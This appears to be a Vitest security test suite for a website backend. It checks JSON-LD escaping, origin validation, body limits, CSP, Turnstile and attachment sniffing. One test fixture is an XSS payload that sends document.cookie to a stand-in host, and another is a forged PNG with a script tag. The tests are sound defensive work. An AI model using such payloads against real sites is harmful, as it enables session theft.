import { describe, expect, it, vi } from 'vitest'

vi.mock('#/shared/env', () => ({
  env: {
    BASE_URL: 'https://yamanwarda.de',
    BETTER_AUTH_SECRET: 'test-better-auth-secret',
    RATE_LIMIT_SECRET: 'test-independent-rate-limit-secret',
    TURNSTILE_SECRET_KEY: '1x0000000000000000000000000000000AA',
    R2_PUBLIC_URL: 'https://media.yamanwarda.de',
  },
}))

import { AppError } from '#/backend/shared/error'
import { inspectContactAttachment, MAX_CONTACT_ATTACHMENT_BYTES } from '#/backend/shared/contact-attachment'
import { createRateLimitKey } from '#/backend/shared/rate-limit'
import {
  readFormDataWithinLimit,
  RequestBodyTooLargeError,
} from '#/backend/shared/request-body'
import {
  assertTurnstile,
  isTurnstileResponseValid,
} from '#/backend/shared/turnstile'
import { toJsonLd } from '#/frontend/lib/seo'
import { buildContentSecurityPolicy, validateMutationRequest } from '#/start'

describe('structured data', () => {
  it('cannot close the script block it is written into', () => {
    const serialised = toJsonLd({
      description: 'x</script><script>fetch("https://evil.example/"+document.cookie)</script>',
    })

    expect(serialised).not.toContain('</script>')
    expect(serialised).not.toContain('<')
    // Still the same JSON: the escapes parse back to the characters they hide.
    expect(JSON.parse(serialised).description).toContain('</script>')
  })

  it('leaves ordinary text readable', () => {
    expect(JSON.parse(toJsonLd({ name: 'Brandt & Söhne' })).name).toBe('Brandt & Söhne')
  })
})

describe('request security', () => {
  it('rejects missing and cross-site origins on data-changing API requests', () => {
    expect(
      validateMutationRequest(new Request('https://yamanwarda.de/api/contact', { method: 'POST' })),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/contact', {
          method: 'POST',
          headers: { origin: 'https://attacker.example' },
        }),
      ),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/contact', {
          method: 'POST',
          headers: { origin: 'https://yamanwarda.de' },
        }),
      ),
    ).toBeNull()
  })

  it('lets a signed webhook through without an origin, and nothing else', () => {
    // A mail forwarder sends no Origin header. This endpoint authenticates the
    // caller by signature instead, and reads no cookies.
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/inbound-email', { method: 'POST' }),
      ),
    ).toBeNull()
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/inbound-email/other', { method: 'POST' }),
      ),
    ).toBe('FORBIDDEN_ORIGIN')
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/admin/projects', { method: 'POST' }),
      ),
    ).toBe('FORBIDDEN_ORIGIN')
  })

  it('holds the inbound webhook to its own body limit', () => {
    const inbound = (bytes: number) =>
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/inbound-email', {
          method: 'POST',
          headers: { 'content-length': String(bytes) },
        }),
      )

    // A letter carrying a ten-megabyte attachment, base64 inside the JSON,
    // has to pass here: at the old one-megabyte ceiling every client file
    // was refused with a 413 before the route saw it.
    expect(inbound(20 * 1024 * 1024)).toBeNull()
    expect(inbound(31 * 1024 * 1024)).toBe('BODY_TOO_LARGE')
  })

  it('caps a new letter from the admin with its files', () => {
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/admin/inbox/compose', {
          method: 'POST',
          headers: {
            origin: 'https://yamanwarda.de',
            'content-length': String(26 * 1024 * 1024),
          },
        }),
      ),
    ).toBe('BODY_TOO_LARGE')
  })

  it('rejects oversized known request bodies before parsing', () => {
    expect(
      validateMutationRequest(
        new Request('https://yamanwarda.de/api/contact', {
          method: 'POST',
          headers: { origin: 'https://yamanwarda.de', 'content-length': String(7 * 1024 * 1024) },
        }),
      ),
    ).toBe('BODY_TOO_LARGE')
  })

  it('stops a streaming multipart body even when Content-Length is absent', async () => {
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new TextEncoder().encode('12345'))
        controller.enqueue(new TextEncoder().encode('67890'))
        controller.close()
      },
    })
    const request = new Request('https://yamanwarda.de/api/contact', {
      method: 'POST',
      headers: { 'content-type': 'multipart/form-data; boundary=test' },
      body,
      duplex: 'half',
    } as RequestInit & { duplex: 'half' })

    await expect(readFormDataWithinLimit(request, 8)).rejects.toBeInstanceOf(
      RequestBodyTooLargeError,
    )
  })

  it('builds a nonce-bound CSP that blocks objects and foreign framing', () => {
    const policy = buildContentSecurityPolicy('nonce123')

    expect(policy).toContain("script-src 'self' 'nonce-nonce123' https://challenges.cloudflare.com")
    expect(policy).toContain("object-src 'none'")
    expect(policy).toContain("frame-ancestors 'none'")
  })
})

describe('privacy-preserving limits', () => {
  it('uses keyed digests rather than storing the raw identity', async () => {
    const key = await createRateLimitKey('contact-email', 'visitor@example.com')

    expect(key).toMatch(/^v1:contact-email:[a-f0-9]{64}$/)
    expect(key).not.toContain('visitor@example.com')
  })
})

describe('Turnstile verification', () => {
  it.each([
    { success: false, action: 'booking_create', hostname: 'yamanwarda.de' },
    { success: true, action: 'contact_submit', hostname: 'yamanwarda.de' },
    { success: true, action: 'booking_create', hostname: 'attacker.example' },
  ] as const)('rejects an invalid verification result', (response) => {
    expect(isTurnstileResponseValid(response, 'booking_create', true)).toBe(false)
  })

  it('accepts only the expected hostname and action', () => {
    expect(
      isTurnstileResponseValid(
        { success: true, action: 'booking_create', hostname: 'yamanwarda.de' },
        'booking_create',
        true,
      ),
    ).toBe(true)
  })

  it('takes the testing key only where the hostname is not enforced', () => {
    // What Cloudflare actually answers for a dummy token: no action, and
    // `example.com` as the hostname.
    const testingKey = {
      success: true,
      hostname: 'example.com',
      metadata: { result_with_testing_key: true },
    } as const

    expect(isTurnstileResponseValid(testingKey, 'booking_create', false)).toBe(true)
    expect(isTurnstileResponseValid(testingKey, 'booking_create', true)).toBe(false)
  })

  it('rejects missing tokens without calling Cloudflare', async () => {
    const fetch = vi.fn()
    vi.stubGlobal('fetch', fetch)

    await expect(assertTurnstile({ token: '', action: 'contact_submit' })).rejects.toMatchObject({
      code: 'BOT_CHECK_FAILED',
    })
    expect(fetch).not.toHaveBeenCalled()
  })

  it('fails closed when verification is unavailable', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('network unavailable')))

    await expect(
      assertTurnstile({ token: 'one-time-token', action: 'contact_submit' }),
    ).rejects.toSatisfy(
      (error: unknown) => error instanceof AppError && error.code === 'BOT_CHECK_FAILED',
    )
  })
})

describe('contact attachment bytes', () => {
  it('accepts a structurally marked PDF regardless of its claimed filename', () => {
    const bytes = new TextEncoder().encode('%PDF-1.7\ncontent\n%%EOF')

    expect(inspectContactAttachment(bytes)).toEqual({
      extension: 'pdf',
      contentType: 'application/pdf',
    })
  })

  it('rejects a renamed text file and an oversized file', () => {
    expect(inspectContactAttachment(new TextEncoder().encode('not really a picture'))).toBeNull()
    expect(inspectContactAttachment(new Uint8Array(MAX_CONTACT_ATTACHMENT_BYTES + 1))).toBeNull()
  })

  it('accepts a complete PNG but rejects a forged header with a script payload', () => {
    const valid = Uint8Array.from(
      atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII='),
      (character) => character.charCodeAt(0),
    )
    const forged = new Uint8Array(24 + 8)
    forged.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
    new DataView(forged.buffer).setUint32(16, 1)
    new DataView(forged.buffer).setUint32(20, 1)
    forged.set(new TextEncoder().encode('<script>'), 24)

    expect(inspectContactAttachment(valid)).toEqual({
      extension: 'png',
      contentType: 'image/png',
    })
    expect(inspectContactAttachment(forged)).toBeNull()
  })
})
